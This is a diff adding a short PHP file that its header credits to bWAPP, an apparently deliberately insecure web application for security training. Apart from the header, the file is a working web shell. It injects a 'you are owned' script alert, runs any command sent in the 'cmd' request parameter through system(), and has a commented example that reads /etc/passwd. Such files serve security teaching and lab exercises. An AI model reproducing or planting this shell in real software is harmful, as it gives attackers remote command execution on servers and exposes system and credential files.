@@ -1,0 +1,31 @@
+<?php
+
+/*
+
+bWAPP, or a buggy web application, is a free and open source deliberately insecure web application.
+It helps security enthusiasts, developers and students to discover and to prevent web vulnerabilities.
+bWAPP covers all major known web vulnerabilities, including all risks from the OWASP Top 10 project!
+It is for educational purposes only.
+
+Enjoy!
+
+Malik Mesellem
+Twitter: @MME_IT
+
+© 2013 MME BVBA. All rights reserved.
+
+*/
+
+echo "<script>alert(\"U 4r3 0wn3d by MME!!!\");</script>";
+
+if(isset($_REQUEST["cmd"]))
+{
+
+    system($_REQUEST["cmd"]);
+    // system("cat /etc/passwd");
+
+    echo "<br /><br />";
+
+}
+
+?>
